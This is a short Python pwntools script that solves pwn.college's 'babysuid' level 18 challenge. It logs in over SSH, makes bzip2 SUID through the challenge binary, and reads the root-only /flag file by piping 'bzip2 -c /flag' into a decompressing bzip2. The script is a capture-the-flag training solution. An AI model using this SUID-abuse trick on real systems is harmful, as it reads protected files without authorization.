from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level18 to make /usr/bin/bzip2 SUID
s.process("/challenge/babysuid_level18")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/bzip2 /flag
# ? bzip2 -c to output to stdout
# ? pipe to another bzip2 command with -d to decompress and you get the flag
sh.sendline(b"bzip2 -c /flag | bzip2 -d -")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"FLAG: pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
